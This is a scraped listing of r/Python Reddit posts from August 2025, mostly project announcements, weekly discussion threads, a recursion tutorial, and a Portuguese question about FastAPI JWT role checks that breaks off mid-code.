1mmmozq,Minimal Python secp256k1 + ECDSA implementation,Mou3iz_Edd,2,0,2025-08-10 16:17:55,https://www.reddit.com/r/Python/comments/1mmmozq/minimal_python_secp256k1_ecdsa_implementation/,"Wrote a tiny Python implementation of secp256k1 elliptic curve + ECDSA signing/verification.

Includes:

\- secp256k1 curve math

\- Key generation

\- Keccak-256 signing

\- Signature verification

Repo:¬†[https://github.com/0xMouiz/python-secp256k1](https://github.com/0xMouiz/python-secp256k1)"
1mmldxy,Using Python + MCP + AI to Access and Process Real-Time Web Data,PINKINKPEN100,0,0,2025-08-10 15:26:27,https://www.reddit.com/r/Python/comments/1mmldxy/using_python_mcp_ai_to_access_and_process/,"I‚Äôve been experimenting with connecting Large Language Models (LLMs) like Claude and ChatGPT to live web data, and found a workflow that helps overcome the usual ‚Äústuck in the past‚Äù problem with these models.

The setup works like this:

1. Use Python with an MCP (Model Context Protocol) server to fetch real-time web data.
2. Deliver the structured data directly to your AI tool or agent.
3. Have the LLM process, summarize, or transform the incoming information.
4. Use standard Python libraries (e.g., Pandas, Matplotlib) to analyze or visualize the results.

**Why MCP?**  
Most LLMs can‚Äôt browse the internet‚Äîthey operate in secure sandboxes without live data access. MCP is like a universal adapter, letting AI tools request and receive structured content from outside sources.

**Example use cases:**

* Pulling the latest market prices and having the LLM compare trends.
* Crawling news headlines and summarizing them into daily briefs.
* Feeding fresh product listings into an AI model for category tagging.

For testing, I used the [Crawlbase MCP Server](https://crawlbase.com/blog/introducing-crawlbase-mcp-feed-real-time-web-data-to-the-llms/) since it supports MCP and can return structured JSON from live websites. Similar setups could be done with other MCP-compatible crawling tools depending on your needs.

**Supported Tools:**  
I‚Äôve tried MCP integration with Claude Desktop, Cursor IDE, and Windsurf IDE. In each, you can run commands to:

* Crawl a URL and return HTML.
* Extract clean markdown.
* Capture page screenshots.

Once configured, these tools can send prompts like:

*‚ÄúCrawl New York Times and return markdown‚Äù*

The MCP server then returns live, structured data straight into the model‚Äôs context‚Äîno copy-pasting, no outdated info.

If you‚Äôve been exploring ways to make AI agents work with up-to-the-minute web content, this type of setup is worth trying. Curious if anyone else here has integrated Python, MCP, and LLMs for real-time workflows?"
1mmi5px,Transfer article or note from anywhere to Anki by just copying the content,sultanaiyan1098,2,0,2025-08-10 13:09:09,https://www.reddit.com/r/Python/comments/1mmi5px/transfer_article_or_note_from_anywhere_to_anki_by/,"* **What My Project Does** \- Transfer article or note from anywhere to Anki by just copying the content, whether image, rich text, video, etc.
* **Target Audience** \- You want to revise the note, article or content from anywhere? Great, this application is for you, even though it does not create questions automatically, which you don't really need when you want complete content to be bookmarked, utilize Anki's active recalling technique, without any chunks of questions.
* **Comparison** \- None
* Check the github page for showcase and demo
   * [https://github.com/sultanate-sultan/Transfer-to-Anki-any11](https://github.com/sultanate-sultan/Transfer-to-Anki-any11)
* *The beautiful anki formatting you are seeing in the last example is because I have applied custom styling.*
   * *Check it out here*: [***https://www.reddit.com/r/Anki/comments/1mlnbaw/default\_anki\_looks\_boring\_and\_out\_of\_date\_apply/***](https://www.reddit.com/r/Anki/comments/1mlnbaw/default_anki_looks_boring_and_out_of_date_apply/)"
1mmh9gl,Simple tool : ImageDraw() UI helper - draw shapes and get x0y0,ozh,4,1,2025-08-10 12:26:53,https://www.reddit.com/r/Python/comments/1mmh9gl/simple_tool_imagedraw_ui_helper_draw_shapes_and/,"In a Python project I needed to draw a few shapes and I found it quite cumbersome to make up coordinates (x0 y0) and such. 

I made this little UI helper so maybe it'll help someone else : https://github.com/ozh/draw_ui_helper"
1mmea2j,Limekit ‚Äì Build cross-platform GUIs in lua with PySide6,OmegaMsiska,25,7,2025-08-10 09:36:34,https://www.reddit.com/r/Python/comments/1mmea2j/limekit_build_crossplatform_guis_in_lua_with/,"Hi Python community! üëã

I‚Äôve just released [**Limekit**](https://github.com/mitosisX/Limekit) ‚Äî a wrapper framework for PySide6 that lets you build **cross-platform desktop GUIs in Lua**‚Ä¶ and you can have a window on screen with just **2 lines of code**. üöÄ

# What my project does

Limekit lets developers write GUI apps entirely in Lua while using Python‚Äôs PySide6 under the hood. The Python layer runs entirely inside the engine ‚Äî Lua developers never have to touch Python code. Just:

1. Install Python
2. Install Limekit (distributed as wheel for now)
3. Forget about Python and start coding in Lua

I even built a **100% Lua IDE** ([Limer-Limekit](https://github.com/mitosisX/Limer-Limekit)) to prove it works.

# Target audience

* **Lua developers** who want native, cross-platform GUI apps without dealing with C++ bindings or complex cross-compilation setups
* **Python developers** curious about embedding Lua and mixing languages for fun or lightweight scripting in their apps
* Hobbyists who want a fast, small-footprint language with access to a modern GUI toolkit

# Comparison

* **Against Lua GUI bindings in C/C++:** No need to compile or configure for each platform ‚Äî Python acts as the bridge

To appreciate how the engine works or how the ""magic"" really happens , head over to [https://github.com/mitosisX/Limekit/](https://github.com/mitosisX/Limekit/)

THE IDE (for developing the Limekit apps, 100% lua)

[https://github.com/mitosisX/Limer-Limekit](https://github.com/mitosisX/Limer-Limekit)"
1mmdyf7,A puzzling Python program,commandlineluser,0,8,2025-08-10 09:15:11,https://www.reddit.com/r/Python/comments/1mmdyf7/a_puzzling_python_program/,"https://jo3-l.dev/posts/python-countdown/

    class countdown:
        def __init__(self, n):
            self.n = n

        def __getitem__(self, k):
            if v := self.n - k:
                return print(v),

    print(""rocket launching üöÄ"") in countdown(10)


What does it output, and why?"
1mmcufh,Kreuzberg v3.11: the ultimate Python text extraction library,Goldziher,274,41,2025-08-10 08:02:07,https://www.reddit.com/r/Python/comments/1mmcufh/kreuzberg_v311_the_ultimate_python_text/,"Hi Peeps,

I'm excited to share Kreuzberg v3.11, which has evolved significantly since the v3.1 release I shared here last time. We've been hard at work improving performance, adding features, and most importantly - benchmarking against competitors. You can see [the full benchmarks here](https://benchmarks.kreuzberg.dev/) and [the changelog here](https://github.com/Goldziher/kreuzberg/releases).

For those unfamiliar - Kreuzberg is a document intelligence framework that offers fast, lightweight, and highly performant CPU-based text extraction from virtually any document format.

## Major Improvements Since v3.1:

- **Performance overhaul**: 30-50% faster extraction based on deep profiling (v3.8)
- **Document classification**: AI-powered automatic document type detection - invoices, contracts, forms, etc. (v3.9)
- **MCP server integration**: Direct integration with Claude and other AI assistants (v3.7)
- **PDF password support**: Handle encrypted documents with the crypto extra (v3.10)
- **Python 3.10+ optimizations**: Match statements, dict merge operators for cleaner code (v3.11)
- **CLI tool**: Extract documents directly via `uvx kreuzberg extract`
- **REST API**: Dockerized API server for microservice architectures
- **License cleanup**: Removed GPL dependencies for pure MIT compatibility (v3.5)

## Target Audience

The library is ideal for developers building RAG (Retrieval-Augmented Generation) applications, document processing pipelines, or anyone needing reliable text extraction. It's particularly suited for:
- Teams needing local processing without cloud dependencies
- Serverless/containerized deployments (71MB footprint)
- Applications requiring both sync and async APIs
- Multi-language document processing workflows

## Comparison

Based on our [comprehensive benchmarks](https://benchmarks.kreuzberg.dev/), here's how Kreuzberg stacks up:

**Unstructured.io**: More enterprise features but 4x slower (4.8 vs 32 files/sec), uses 4x more memory (1.3GB vs 360MB), and 2x larger install (146MB). Good if you need their specific format supports, which is the widest.

**Markitdown (Microsoft)**: Similar memory footprint but limited format support. Fast on supported formats (26 files/sec on tiny files) but unstable for larger files.

**Docling (IBM)**: Advanced ML understanding but extremely slow (0.26 files/sec) and heavy (1.7GB memory, 1GB+ install). Non viable for real production workloads with GPU acceleration.

**Extractous**: Rust-based with decent performance (3-4 files/sec) and excellent memory stability. This is a viable CPU based alternative. It had limited format support and less mature ecosystem.

**Key differentiator**: Kreuzberg is the only framework with 100% success rate in our benchmarks - zero timeouts or failures across all tested formats.

## Performance Highlights

| Framework | Speed (files/sec) | Memory | Install Size | Success Rate |
|-----------|------------------|---------|--------------|--------------|
| Kreuzberg | 32 | 360MB | 71MB | 100% |
| Unstructured | 4.8 | 1.3GB | 146MB | 98.8% |
| Markitdown | 26* | 360MB | 251MB | 98.2% |
| Docling | 0.26 | 1.7GB | 1GB+ | 98.5% |

You can see the codebase on GitHub: https://github.com/Goldziher/kreuzberg. If you find this library useful, please star it ‚≠ê - it really helps with motivation and visibility.

We'd love to hear about your use cases and any feedback on the new features!"
1mm81nk,Loadouts for Genshin Impact v0.1.10 is OUT NOW with support for Genshin Impact v5.8 Phase 1,t0xic0der,11,0,2025-08-10 03:18:05,https://www.reddit.com/r/Python/comments/1mm81nk/loadouts_for_genshin_impact_v0110_is_out_now_with/,"# About

This is a desktop application that allows travelers to manage their custom equipment of artifacts and weapons for playable characters and makes it convenient for travelers to calculate the associated statistics based on their equipment using the semantic understanding of how the gameplay works. Travelers can create their bespoke loadouts consisting of characters, artifacts and weapons and share them with their fellow travelers. Supported file formats include a human-readable¬†**Yet Another Markup Language (YAML)**¬†serialization format and a JSON-based¬†**Genshin Open Object Definition (GOOD)**¬†serialization format.

This project is currently in its beta phase and we are committed to delivering a quality experience with every release we make. If you are excited about the direction of this project and want to contribute to the efforts, we would greatly appreciate it if you help us boost the project visibility by¬†**starring the project repository**, address the releases by¬†**reporting the experienced errors**, choose the direction by¬†**proposing the intended features**, enhance the usability by¬†**documenting the project repository**, improve the codebase by¬†**opening the pull requests**¬†and finally, persist our efforts by¬†**sponsoring the development members**.

# Technologies

* Pydantic
* Pytesseract
* PySide6
* Pillow

# Updates

[Loadouts for Genshin Impact v0.1.10](https://gridhead.net/loadouts-for-genshin-impact-v0-1-10-released/) is OUT NOW with the addition of support for recently released characters like¬†**Ineffa**¬†and for recently released weapons like¬†**Fractured Halo**¬†and¬†**Flame-Forged Insight**¬†from¬†**Genshin Impact v5.8 Phase 1**. Take this FREE and OPEN SOURCE application for a spin using the links below to manage the custom equipment of artifacts and weapons for the playable characters.

# Resources

* [Loadouts for Genshin Impact - GitHub](https://github.com/gridhead/gi-loadouts?ref=gridhead.net)
* [Loadouts for Genshin Impact - PyPI](https://pypi.org/project/gi-loadouts?ref=gridhead.net)
* [Loadouts for Genshin Impact v0.1.10](https://github.com/gridhead/gi-loadouts/releases/tag/0.1.10?ref=gridhead.net)
   * [Executable for GNU/Linux distributions](https://github.com/gridhead/gi-loadouts/releases/download/0.1.10/gi-loadouts-0.1.10?ref=gridhead.net)
   * [Executable for Microsoft Windows](https://github.com/gridhead/gi-loadouts/releases/download/0.1.10/gi-loadouts-0.1.10.exe?ref=gridhead.net)

# Installation

Besides its availability as a¬†[*repository package on PyPI*](https://pypi.org/project/gi-loadouts/?ref=gridhead.net)¬†and as an¬†[*archived binary on PyInstaller*](https://github.com/gridhead/gi-loadouts/releases/tag/0.1.10?ref=gridhead.net), Loadouts for Genshin Impact is now available as an¬†[*installable package on Fedora Linux*](https://src.fedoraproject.org/rpms/gi-loadouts?ref=gridhead.net). Travelers using¬†[*Fedora Linux 42 and above*](https://bodhi.fedoraproject.org/updates/?search=gi-loadouts&user=t0xic0der&ref=gridhead.net)¬†can install the package on their operating system by executing the following command.

    $ sudo dnf install gi-loadouts --assumeyes --setopt=install_weak_deps=False

# Screenshots

* [Ineffa - Workspace](https://gridhead.net/content/images/2025/08/infa_dash.png)
* [Ineffa - Results](https://gridhead.net/content/images/2025/08/infa_rslt.png)
* [Fractured Halo - Workspace](https://gridhead.net/content/images/2025/08/ftho.png)
* [Flame-Forged Insight - Workspace](https://gridhead.net/content/images/2025/08/ffit.png)

# Appeal

While allowing you to experiment with various builds and share them for later, Loadouts for Genshin Impact lets you take calculated risks by showing you the potential of your characters with certain artifacts and weapons equipped that you might not even own. Loadouts for Genshin Impact has been and always be a free and open source software project and we are committed to delivering a quality experience with every release we make.

# Disclaimer

With an extensive suite of over 1465 diverse functionality tests and impeccable 100% source code coverage, we proudly invite auditors and analysts from MiHoYo and other organizations to review our free and open source codebase. This thorough transparency underscores our unwavering commitment to maintaining the fairness and integrity of the game.

The users of this ecosystem application can have complete confidence that their accounts are safe from warnings, suspensions or terminations when using this project. The ecosystem application ensures complete compliance with the terms of services and the regulations regarding third-party software established by MiHoYo for Genshin Impact.

All rights to Genshin Impact assets used in this project are reserved by miHoYo Ltd. and Cognosphere Pte., Ltd. Other properties belong to their respective owners."
1mm446r,Sunday Daily Thread: What's everyone working on this week?,AutoModerator,5,9,2025-08-10 00:00:37,https://www.reddit.com/r/Python/comments/1mm446r/sunday_daily_thread_whats_everyone_working_on/,"# Weekly Thread: What's Everyone Working On This Week? üõ†Ô∏è

Hello /r/Python! It's time to share what you've been working on! Whether it's a work-in-progress, a completed masterpiece, or just a rough idea, let us know what you're up to!

## How it Works:

1. **Show & Tell**: Share your current projects, completed works, or future ideas.
2. **Discuss**: Get feedback, find collaborators, or just chat about your project.
3. **Inspire**: Your project might inspire someone else, just as you might get inspired here.

## Guidelines:

* Feel free to include as many details as you'd like. Code snippets, screenshots, and links are all welcome.
* Whether it's your job, your hobby, or your passion project, all Python-related work is welcome here.

## Example Shares:

1. **Machine Learning Model**: Working on a ML model to predict stock prices. Just cracked a 90% accuracy rate!
2. **Web Scraping**: Built a script to scrape and analyze news articles. It's helped me understand media bias better.
3. **Automation**: Automated my home lighting with Python and Raspberry Pi. My life has never been easier!

Let's build and grow together! Share your journey and learn from others. Happy coding! üåü"
1mlys26,"The Recursive Leap of Faith, Explained (with examples in Python)",AlSweigart,14,14,2025-08-09 20:02:00,https://www.reddit.com/r/Python/comments/1mlys26/the_recursive_leap_of_faith_explained_with/,"https://inventwithpython.com/blog/leap-of-faith.html

I've written a short tutorial about what exactly the vague ""leap of faith"" technique for writing recursive functions means, with factorial and permutation examples. The code is written in Python.

TL;DR:

1. Start by figuring out the data types of the parameters and return value.
2. Next, implement the base case.
3. Take a leap of faith and assume your recursive function magically returns the correct value, and write your recursive case.
4. First Caveat: The argument to the recursive function call cannot be the original argument.
5. Second Caveat: The argument to the recursive function call must ALWAYS get closer to the base case.

I also go into why so many other tutorials fail to explain what ""leap of faith"" actually is and the unstated assumptions they make. There's also the explanation for the concept that ChatGPT gives, and how it matches the deficiencies of other recursion tutorials.

I also have this absolutely demented (but technically correct!) implementation of recursive factorial:

    def factorial(number):
        if number == 100:
            # BASE CASE
            return 93326215443944152681699238856266700490715968264381621468592963895217599993229915608941463976156518286253697920827223758251185210916864000000000000000000000000
        elif number < 100:
            # RECURSIVE CASE
            return factorial(number + 1) // (number + 1)
        else:
            # ANOTHER RECURSIVE CASE
            return number * factorial(number - 1)"
1mloud2,drf-shapeless-serializers: Escape Django's Serializer Hell with Dynamic Runtime Magic,Any-Data1138,2,3,2025-08-09 12:59:46,https://www.reddit.com/r/Python/comments/1mloud2/drfshapelessserializers_escape_djangos_serializer/,"Hi  
I built¬†drf-shapeless-serializers¬†to solve Django REST Framework's serializer hell. No more creating endless serializer classes for minor variations!

# What My Project Does

Eliminates serializer hell by enabling dynamic runtime configuration of DRF serializers, reducing boilerplate by up to 80% while maintaining full functionality.

# Target Audience

Production-ready for Django developers who need:

* Multiple API versions
* Flexible data representations
* Complex nested serialization
* Rapid API development

# Comparison

Unlike traditional DRF serializers that require static class definitions, drf-shapeless-serializers offers:

* **Runtime configuration** instead of class-based
* **Dynamic nesting** instead of fixed relationships
* **Minimal boilerplate** instead of repetitive class definitions
* **Field-level control** without subclassing

# Samples

    # Comprehensive dynamic example
    
    BookSerializer(
    
        book,
    
        fields=['title', 'author', 'price'],
    
        rename_fields={'price': 'retail_price'},
    
        nested={
    
            'author': {
    
                'serializer': AuthorSerializer,
    
                'fields': ['name', 'email']
    
            }
    
        }
    
    )
    
    
    
    # Inline Model Serializer example without the need to declare a model serializer class
    
    InlineShapelessModelSerializer(
    
        book,
    
        model=Book,
    
        fields=['title', 'publication_date']
    
    )

**Get it:**

‚≠ê [GitHub](https://github.com/khaledsukkar2/drf-shapeless-serializers)

üìö [Docs](https://drf-shapeless-serializers.readthedocs.io/)

***Looking for contributors! So please get involved if you love it and give it a star too, I'd love to see this package grow if it makes people's life easier!*** ‚ù§Ô∏è

"
1mlma2a,Turso python API (SQL API),Gorrilac,0,1,2025-08-09 10:34:49,https://www.reddit.com/r/Python/comments/1mlma2a/turso_python_api_sql_api/,"

# What my project does:
Helps with SQLlite related operations on the turso platform: https://turso.tech/

# Target audience:
For people who use turso and python

# Comparison: 
The official turso python API
And this project: https://pypi.org/project/tursopy/

Hey guys, so if you have ever used the official python api from turso you know how much it sucks and is over bloated. And for this very reason, I decided almost a year ago to buildthis package. Nothing out of the ordinary happened after that. But after a while some people started seeing it, and now I have some people contributing to the project. And even an official maintainer:

[TursoPy](https://github.com/Marcus-Peterson/tursopy)



Makes me happy that my little project is as valuable enough that someone actually wanted to use it and contribute to it

Note ‚ö†Ô∏è: There will come a breaking change pretty soon, so if you decide to use it now and and do pip update to your local environment. It will break. So keep that in mind


Want to contribute?

Here are some things that would be nice have for TursoPy

‚Ä¢ A TODO.md

‚Ä¢Improved documentation

‚Ä¢ Official docs with tutorial like examples

‚Ä¢ Better system for dealing and handling with data types (I have noticed a lot of mismatch errors between types and what types the turso platform expects to receive) 

‚Ä¢ A proper DB api driver (Whatever that means, but I have been told there is none at the moment) 

‚Ä¢ Building new core functionalities in C/Cython for e.g better systems for ‚Äúpreprocessing‚Äù db queries before a http request occurs. 

‚Ä¢ Add new CRUD functionalities

‚Ä¢ If you can come up with anything, feel free to suggest whatever


It‚Äôs been almost 9 months since I myself last worked on the project. So, you might become more knowledgeable than me if you acquaint yourself with the project


Note üìù ‚ö†Ô∏è
If you are serious about contributing:

If you can do something from scratch do it: I would rather have you reinventing the wheel than you being the reason the whole car broke down and crashed into a tree, because the bolts where from the wrong type of manufacturer. 

Adding a new dependcy should be a last resort rather then the first thing you think of (e.g there is a reason the TursoPy is using the requests library instead of relying on a custom built http protocol implementation). However, on that note. I‚Äôm not a stubborn donkey, if you can put forth valid arguments as to why TursoPy **needs** a particular dependency my ears are open but my heart is closed until proven otherwise. 

All in all: Simplicty and minimalism is what  TursoPy **strives** to be.

TL;DR:
I made my own py turso api, it‚Äôs simple, want to contribute? 
"
1mlk2gm,Any youtubers who teach python by creating engaging projects?,winrinacross,0,2,2025-08-09 08:04:27,https://www.reddit.com/r/Python/comments/1mlk2gm/any_youtubers_who_teach_python_by_creating/,"Saw a TikTok where some guy coded lyrics to the song ""Rock that body"" and wondered if there was anyone who created fun things like that and simultaneously taught python concepts"
1mlj7ce,How to safely run python code in a container so it respects cgroup limits?,Euphoric_Sandwich_74,47,27,2025-08-09 07:08:07,https://www.reddit.com/r/Python/comments/1mlj7ce/how_to_safely_run_python_code_in_a_container_so/,"Not a Python dev, but mainly work on managing infra.

I manage a large cluster of with some Python workloads and recently realized that Python doesn‚Äôt really read the cgroup mem.max or configured CPU limits.

For e.g. Go provides GOMAXPROCS and GOMEMLIMIT for helping the runtime.


There are some workarounds suggested here for memory - https://github.com/python/cpython/issues/86577

But the issue has been open for years.


"
1mlizot,Why there is no polygon screenshot tool in the market? I had to make it myself,sultanaiyan1098,57,16,2025-08-09 06:55:11,https://www.reddit.com/r/Python/comments/1mlizot/why_there_is_no_polygon_screenshot_tool_in_the/,"* **What My Project Does -** Take a screenshot by drawing a precise polygon rather than being limited to a rectangular or manual free-form shape
* **Target Audience -** Meant for *production*
* **Comparison -** I was tired of windows built in screenshot where I had to draw the shape manually
* Open sourced the proj. you can get it here: [https://github.com/sultanate-sultan/polygon-screenshot-tool](https://github.com/sultanate-sultan/polygon-screenshot-tool)"
1mli3b5,YAMosse - find timestamps for common sounds in sound files,tomysshadow,1,2,2025-08-09 05:59:24,https://www.reddit.com/r/Python/comments/1mli3b5/yamosse_find_timestamps_for_common_sounds_in/,"**What My Project Does:**

[YAMosse](https://github.com/tomysshadow/YAMosse/) is my interface for TensorFlow's [YAMNet](https://github.com/tensorflow/models/tree/master/research/audioset/yamnet) model. It can be used to identify the timestamps of specific sounds, or create a transcript of the sounds in a sound file. For example, you could use it to tell which parts of a sound file contain music, or which parts contain speech. You can use it as a GUI or use it on the command line.

[https://github.com/tomysshadow/YAMosse](https://github.com/tomysshadow/YAMosse)

I created this application because a while back, I wanted an app that could give me a list of timestamps of some sounds in a sound file. I knew the technology for this definitely existed, what with machine learning and all, but I was surprised to find there didn't seem to be any existing program I could just drag and drop a file into, in order to detect the sounds that were in it. Instead, when I Googled how to get a list of timestamps of sounds in a sound file, all I got were tutorials about how to write code to do it yourself in Python.

Perhaps Google was catering to me because I usually use it to look up programming questions, but I didn't want to have to write a bunch of code to do this, I just wanted a program that did it for me. So naturally, I wrote a bunch of code to do it. And now I have a program that could do it for me.

It has some nice features like:

* it can detect all 521 different classes of common sounds that can be detected by the YAMNet model
* it supports multiple file selection and can scan multiple files at once using multiprocessing
* it provides multiple ways to identify sounds: using a Confidence Score or using the Top Ranked classes
* you can import and export preset files in order to save the options you used for a scan
* you can calibrate the sound classes so that it is more confident or less confident about them, in order to eliminate false positives
* it can output the results as plaintext or as a JSON file
* it can write out timestamps for long sounds as timespans (like 1:30 - 1:35, instead of 1:30, 1:31, 1:32...)
* you can filter out silence by setting the background noise volume

This is my first ""real"" Python script. I say ""real"" in quotes because I have written Python before, but only in the form of quick n' dirty batch script replacements that I didn't spend much time on. So this is what I'd consider my first actual Python project, the first time I've made something medium sized. I am an experienced developer in other languages, but this is well outside of my usual wheelhouse - most of the stuff I program is something to do with videogames, usually in C++, usually command line based or a DLL so it doesn't have any GUI. As such, I expect there will be parts of the code here that aren't as elegant - or ""Pythonic"" as the hip kids say - as it could be, and it's possible there are standard Python conventions that I am unaware of that would help improve this, but I tried my absolute best to make it quality.

**Target Audience:**

This program is meant primarily for intermediate to advanced computer users who, like me, would likely be able to program this functionality themselves given the time but simply don't want to write a bunch of code to actually get semi-nice looking results. It has features aimed at those who know what they're doing with audio, such as a logarithmic/linear toggle for volume for example. I expect that there are probably many niche cases where you will still need to write more specific code using the model directly, but the goal is to cover what I imagine would be the most common use case.

I decided to go with Python for this project because that is what the YAMNet code was written in. I could have opted to make a simple command line script and then do the GUI in something else entirely, but TensorFlow is a pretty large dependency already so I didn't want to increase the size of the dependencies even more by tossing NodeJS on top of this. So I decided to do everything in Python, to keep the dependencies to a minimum.

**Comparison:**

In comparison to YAMNet itself, YAMosse is much more high level and abstract, and does not require writing any actual code to interact with. I could not find any comparable GUI to do something similar to this.

Please enjoy using YAMosse!"
1mli2sy,Mini PyTorch Lightning Project,m-delr,1,0,2025-08-09 05:58:29,https://www.reddit.com/r/Python/comments/1mli2sy/mini_pytorch_lightning_project/,"I‚Äôm an incoming college first-year and am hoping to land a SWE internship next summer. I‚Äôve programmed in Python for quite a while, and have made small scale ML projects. To step it up a bit, I was thinking of remaking a miniature version of PyTorch Lightning, including the wrappers for the model, optimizer, dataloader, and fitting routines. I would build it out further with a CLI, logging capabilities, and maybe a TensorBoard integration.

Would completing this project contribute substantially to my resume? I‚Äôm trying to explore somewhat unique project ideas that I think will teach me more about software design.

For those who aren‚Äôt familiar with PyTorch Lightning:
https://github.com/Lightning-AI/pytorch-lightning"
1mldov3,How weird was your first interaction with Python? I learned Python while writing a C++ module.,Humdaak_9000,55,40,2025-08-09 02:03:10,https://www.reddit.com/r/Python/comments/1mldov3/how_weird_was_your_first_interaction_with_python/,"I was tasked with making some of our C++ code callable from Python.  Before I knew Python.

Fortunately, SWIG helped a lot.  Unfortunately, it was somewhat akin to performing open-heart surgery on someone you're currently on a first date with."
1mlcjsn,Updates on a project I am passionate about- Darnahi,TestPilot1980,0,3,2025-08-09 01:07:32,https://www.reddit.com/r/Python/comments/1mlcjsn/updates_on_a_project_i_am_passionate_about_darnahi/,"Updates on a project I am passionate about- Darnahi

Imagine visiting a doctor 5 years ago. Now ask yourself if you still have the record if you look for it. Darnahi will allow you to store it, index it, and use it to generate personal health insights using a local LLM.

What My Project Does:

Darnahi v2.5 is a personal health intelligence app that allows you to store your health data on your computer and run AI tools locally on it to generate personal insights. Your data never leaves your computer. It is: 1. Self-Hosted (This means you have to host this on your own Linux computer, and all your data stays on your computer; your data does not leave your computer, and security is limited by your own computer's security), 2. Open Source (always free).

Target Audience:
Everyone

Comparison: 
No similar software on market I am aware of.


Requires: Linux, Ollama; gemma3:4b model (download needed).

For demo UI, feel free to click here (features turned off): https://seapoe1809.pythonanywhere.com/login pwd- health

To get a fully functional app, go here and follow instructions:

https://github.com/seapoe1809/Health_server

What‚Äôs New:

	1.	Use local AI to index your unstructured data
2.	‚Å†Secure and do more with your health data
3.	‚Å†Ask questions of your medical records that are stored as structured and unstructured RAG
4.	‚Å†Local running LLM and Local running Darnahi server #privacy
5.	‚Å†Better AI engine that uses NLP to analyze your health files to create health screening recommendations (USPTF based), word clouds, RAG for Darnabot.
6.	‚Å†Own ambient AI- Symptom logger (AI to generate record) for storage in darnahi file server). Can be shared with your provider if you wish in pdf's
7.	‚Å†More comprehensive Chartit to log your basic information in FHIR R4 format
8.	‚Å†Ability to view medical dicom image files, xml files, health suggestions for your age
9.	‚Å†Ability to encrypt and zip your files securely and remotely
10.	‚Å†New AI Modules a)  Anxiety 101 module b) Strep module. c) Weight/ bp/ glucose/ AI water tracker d) IBS module- tracks your dietary and bowel habits; AI FODMAP engine; exercises to manage your IBS, know your IBS and other tips e) Immunization passport- to track and keep record of your immunizations; AI travel advisor; travel map; and other tips 

Try sample module here: https://huggingface.co/spaces/seapoe1809/anxiety_ocd_workbook

Check out the videos: For Darnahi Landing: darnahi_landing.webm

For Darnabot: darnabot2.webm

For Optional Modules https://nostrcheck.me/media/49a2ed6afaabf19d0570adab526a346266be552e65ccbd562871a32f79df865d/ea9801cb687c5ff0e78d43246827d4f1692d4bccafc8c1d17203c0347482c2f9.mp4

For demo UI feel click here (features turned off): https://seapoe1809.pythonanywhere.com/login pwd- health"
1mlb4if,Saturday Daily Thread: Resource Request and Sharing! Daily Thread,AutoModerator,0,0,2025-08-09 00:00:31,https://www.reddit.com/r/Python/comments/1mlb4if/saturday_daily_thread_resource_request_and/,"# Weekly Thread: Resource Request and Sharing üìö

Stumbled upon a useful Python resource? Or are you looking for a guide on a specific topic? Welcome to the Resource Request and Sharing thread!

## How it Works:

1. **Request**: Can't find a resource on a particular topic? Ask here!
2. **Share**: Found something useful? Share it with the community.
3. **Review**: Give or get opinions on Python resources you've used.

## Guidelines:

* Please include the type of resource (e.g., book, video, article) and the topic.
* Always be respectful when reviewing someone else's shared resource.

## Example Shares:

1. **Book**: [""Fluent Python""](https://www.amazon.com/Fluent-Python-Concise-Effective-Programming/dp/1491946008) \- Great for understanding Pythonic idioms.
2. **Video**: [Python Data Structures](https://www.youtube.com/watch?v=pkYVOmU3MgA) \- Excellent overview of Python's built-in data structures.
3. **Article**: [Understanding Python Decorators](https://realpython.com/primer-on-python-decorators/) \- A deep dive into decorators.

## Example Requests:

1. **Looking for**: Video tutorials on web scraping with Python.
2. **Need**: Book recommendations for Python machine learning.

Share the knowledge, enrich the community. Happy learning! üåü"
1mkyegh,Problems scraping Amazon,michele909,0,15,2025-08-08 15:33:38,https://www.reddit.com/r/Python/comments/1mkyegh/problems_scraping_amazon/,"Hey everyone, I got serious problems trying to scrape reviews from Amazon, I'm using ScraperAPI but it keeps blocking me - any suggestion?"
1mkmnev,ajuda com n√≠veis de seguran√ßa no FASTAPI,Ill-Gap-4038,0,3,2025-08-08 05:18:31,https://www.reddit.com/r/Python/comments/1mkmnev/ajuda_com_n√≠veis_de_seguran√ßa_no_fastapi/,"Fala pessoal,  



Estou desenvolvendo um aplicativo de gest√£o de fretes com FastAPI e estou enfrentando um problema ao testar o controle de acesso baseado em fun√ß√µes (roles).  

Alguns endpoints retornam \`401 Unauthorized\` com ""Invalid token"" mesmo eu enviando o token obtido ap√≥s um login bem-sucedido.



\*\*Configura√ß√£o:\*\*

\- Backend em FastAPI

\- JWT para autentica√ß√£o

\- Controle de acesso baseado em fun√ß√µes (admin, motorista, cliente)

\- Uso de \`Depends(get\_current\_user)\` e verifica√ß√µes de fun√ß√£o em algumas rotas



\*\*Problema:\*\*

Quando fa√ßo login e gero o token JWT, a maioria dos endpoints funciona normalmente.  

Mas alguns endpoints (principalmente os que t√™m restri√ß√µes adicionais de fun√ß√£o) retornam \`Invalid token\` ou \`401 Unauthorized\`.  

Isso acontece mesmo usando \*\*o mesmo token\*\* que funciona em outras rotas.



\*\*Trechos de c√≥digo que posso compartilhar:\*\*

\- \`auth.py\` ‚Üí Fun√ß√µes de cria√ß√£o e valida√ß√£o do JWT : 

    from fastapi import APIRouter, Depends, HTTPException, status
    from fastapi.security import OAuth2PasswordBearer
    from sqlalchemy.ext.asyncio import AsyncSession
    from sqlalchemy.future import select
    from app.models import Usuario
    from app.dependencies import pegar_sessao
    from app.security import bcrypt_context
    from app.schemas import UsuarioCriarPublico, LoginSchema
    from jose import JWTError, jwt
    from datetime import datetime, timezone, timedelta
    import os
    from dotenv import load_dotenv
    from fastapi.security import OAuth2PasswordRequestForm
    
    load_dotenv()
    
    auth_router = APIRouter(prefix=""/auth"", tags=[""auth""])
    
    
    SECRET_KEY = os.getenv(""SECRET_KEY"")
    if not SECRET_KEY:
    ¬† ¬† raise ValueError(""SECRET_KEY n√£o foi encontrada no .env ou est√° vazia!"")
    
    ALGORITHM = ""HS256""
    ACCESS_TOKEN_EXPIRE_MINUTES = 30
    REFRESH_TOKEN_EXPIRE_DAYS = 7
    
    
    oauth2_scheme = OAuth2PasswordBearer(tokenUrl=""/auth/login"")
    
    
    
    def criar_token_jwt(data: dict, duracao_token: timedelta):
    ¬† ¬† to_encode = data.copy()
    ¬† ¬† expire = datetime.now(timezone.utc) + duracao_token
    ¬† ¬† to_encode.update({""exp"": expire})
    ¬† ¬† return jwt.encode(to_encode, SECRET_KEY, algorithm=ALGORITHM)
    
    
    
    async def autenticar_usuario(email: str, senha: str, session: AsyncSession):
